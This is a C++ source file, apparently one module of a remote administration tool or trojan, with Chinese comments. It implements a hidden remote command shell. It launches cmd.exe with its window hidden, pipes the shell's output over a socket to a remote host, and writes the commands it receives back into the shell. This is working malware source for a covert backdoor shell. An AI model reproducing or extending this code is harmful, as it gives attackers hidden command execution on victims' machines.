#include "StdAfx.h"
#include "CmdShell.h"

CCmdShell::CCmdShell(void)
{
}

CCmdShell::~CCmdShell(void)
{
}

void CCmdShell::SetCmdSocket( SOCKET sock )
{
	m_socket = sock;
}

//CMD初始化
void CCmdShell::Cmd_Init()
{
	//初始化
	GetStartupInfo(&m_si);
	m_si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    //使CMD的输入和输出与管道相连
	m_si.hStdInput = m_hReadPipe;
	m_si.hStdError = m_hWritePipe;
	m_si.hStdOutput = m_hWritePipe;
	m_si.wShowWindow = SW_HIDE;   //隐藏
	wchar_t szCmdPath[256] = {0};
	//得到系统目录
	GetSystemDirectory(szCmdPath, sizeof(szCmdPath));   //C:\windows\system32
	wcscat_s(szCmdPath, _T("\\cmd.exe"));
	//创建cmd.exe进程
	BOOL bRet = CreateProcess(szCmdPath, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &m_si, &m_pi);
	if (!bRet)
	{
		printf("cmd.exe进程创建失败! \n");
	}
	::CloseHandle(m_pi.hProcess);
}

void CCmdShell::Cmd_Send()
{
	DWORD dwLen = 0;    //管道实际读取的值大小
	char szSendBuf[1024] = {0};
    
	/////////////创建读写两条通道
	SECURITY_ATTRIBUTES sa_w;
	sa_w.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa_w.lpSecurityDescriptor = NULL;
	sa_w.bInheritHandle = TRUE;
	CreatePipe(&m_hReadFile, &m_hWritePipe, &sa_w, 0);  //创建读管道

	SECURITY_ATTRIBUTES sa_r;
	sa_r.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa_r.lpSecurityDescriptor = NULL;
	sa_r.bInheritHandle = TRUE;
	CreatePipe(&m_hReadPipe, &m_hWriteFile, &sa_r, 0);  //创建写管道

    MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_TELNET;
	while (true)
	{
		//读取管道中的数据
		memset(szSendBuf, 0, sizeof(szSendBuf));
		if (!ReadFile(m_hReadFile, szSendBuf, 1023, &dwLen, NULL))   //阻塞的
		{
			break;   //读取失败
		}
		//把管道中的数据发送给远程主机
		COMMOND_S tagCmdInfo;
		memset(&tagCmdInfo, 0, sizeof(COMMOND_S));
		strcpy_s(tagCmdInfo.command, sizeof(szSendBuf), szSendBuf);  //将管道中读取到的数据拷贝到结构体中
		tagCmdInfo.flag = 0;  //结构体保留字段
		memcpy((char*)tagMsgInfo.context, (char*)&tagCmdInfo, sizeof(COMMOND_S));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
	}
	printf("CMD Send Thread Over!\n");
}

void CCmdShell::Cmd_Recv( IN char* pRecvBuf )
{
	DWORD dwByteWriten = 0;
	if (0 == strcmp("exit\r\n", pRecvBuf))  //如果接受的退出的命令
	{
		::CloseHandle(m_hWritePipe);  //关闭读写管道句柄
		::CloseHandle(m_hReadPipe);
	}
	BOOL bWrite = WriteFile(m_hWriteFile, (char*)pRecvBuf, strlen(pRecvBuf), &dwByteWriten, NULL);
	if (!bWrite)
	{
		printf("数据写入管道失败\n");
	}
}
